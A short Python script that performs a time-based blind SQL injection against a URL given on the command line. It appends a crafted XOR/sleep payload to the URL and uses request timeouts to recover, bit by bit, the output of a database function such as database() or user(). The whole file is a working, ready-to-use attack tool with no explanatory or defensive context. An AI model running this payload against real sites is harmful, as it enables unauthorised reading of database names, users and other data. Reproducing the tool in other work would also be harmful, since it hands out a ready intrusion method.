import requests
import time
from argparse import ArgumentParser

def checkTimeOut(url):
   try:
      r = requests.get(url,timeout=3)
   except:
      pass
      return True
   return False

def bitwise(idx,URLs,times, database):
   rlt = ''
   for pos in range(1,9): 
      payload = f"'XOR(if(substr(lpad(bin(ord(substr({database}(),{idx},1))),8,'0'),{pos},1)='1',sleep({times}),0))OR'"
      url = URLs + payload
      print (url)
      if(checkTimeOut(url)):
         rlt += '1'
      else:
         rlt += '0'
   print ("Found: ",rlt, int(rlt,2),chr(int(rlt,2),))
   time.sleep(5)
   return int(rlt,2)

def read_config():
    parser = ArgumentParser()
    parser.add_argument("-u", "--url", help="Url target", required=True)
    parser.add_argument("-t", "--timeout", help="Timeout per request",default=2)
    parser.add_argument("-d", "--database", help="Database Trigger exp:database,user", required=True)
    args = parser.parse_args()
    URLs = str(args.url)
    times = int(args.timeout)
    database=str(args.database)
    return [URLs, times, database] 

if __name__ == '__main__':
    URLs, times, database = read_config()
    rlt = ''
    for idx in range(1,30):
      tmp = bitwise(idx,URLs,times,database)
      if(tmp !=127):
         rlt += chr(tmp)
      else:
         rlt += '?'
      print (rlt)
         
      